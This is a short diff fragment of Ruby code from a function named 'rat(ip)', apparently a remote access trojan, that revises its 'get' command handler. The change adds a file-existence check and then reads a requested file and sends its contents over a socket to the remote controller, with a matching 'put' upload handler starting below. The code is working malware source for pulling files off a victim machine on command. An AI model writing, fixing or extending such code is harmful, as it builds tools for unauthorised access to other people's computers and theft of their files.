@@ -52,18 +52,22 @@ def rat(ip)
           socket.puts 'done'
         end
       when 'get'
-        if format == 'binary'
-          file = File.open(file, 'rb')
-        elsif format == 'text'
-          file = File.open(file, 'r')
+        if File.exist? file
+          if format == 'binary'
+            file = File.open(file, 'rb')
+          elsif format == 'text'
+            file = File.open(file, 'r')
+          else
+            socket.puts 'done'
+          end
+          content = file.gets
+          socket.puts content
+          file.close
+          socket.puts 'done'
         else
-          puts 'done'
+          socket.puts 'error'
         end
 
-        content = file.gets
-        socket.puts content
-        file.close
-        socket.puts 'done'
       when 'put'
 
         if format == 'binary'
